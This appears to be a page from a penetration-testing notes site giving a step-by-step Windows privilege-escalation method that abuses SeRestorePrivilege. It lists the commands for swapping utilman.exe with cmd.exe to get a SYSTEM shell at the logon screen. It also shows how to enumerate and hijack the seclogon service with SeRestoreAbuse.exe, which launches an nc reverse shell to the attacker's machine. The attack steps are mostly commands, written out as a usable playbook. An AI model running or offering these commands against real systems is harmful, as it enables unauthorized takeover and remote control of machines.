---
title: Special Privileges
parent: Method (Windows)
layout: default
nav_order: 10
---

## Special Privileges?
1. Check hacktrickz, payloadallthethings, and https://github.com/hatRiot/token-priv/tree/master/poptoke/poptoke for POC.

## SeRestorePrivilege GUI way:
1. If privilege not enabled, run `EnableSeRestorePrivilege.ps1` to enable it. (Evil-WinRM default enabled it)
2. Replace the utilman.exe with cmd.exe:\
   `mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old`\
   `mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe`
3. Rdesktop to the machine:\
   `rdesktop targetIP`\
   OR `rdesktop -u user targetIP`
4. On the logon page, press **WIN + U** and a SYSTEM shell will be spawned.

## SeRestorePrivilege Non GUI way:
1. Need to find a service that requires us to start manually. Can use the following commands:\
   `sc queryex state=all type=service`\
   `Get-Service | findstr -i "manual"`
2. If no privilege to run above, can try the seclogon service (Check object name is LocalSystem and start value is 0x3 which is manual, and we have the required privilege):\
   `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon`
   `cmd.exe /c sc qc seclogon`
3. Using the following command, check if we can manipulate the service:\
   `sc sdshow seclogon` (make sure AU or WD has RP)
4. Using SeRestoreAbuse.exe, run the following (by default it is using seclogon in the exploit, change if needed) can put reverse shell also if don't want to use nc:\
   `SeRestoreAbuse.exe "C:\users\public\nc.exe kaliIP kaliPort -e cmd.exe"`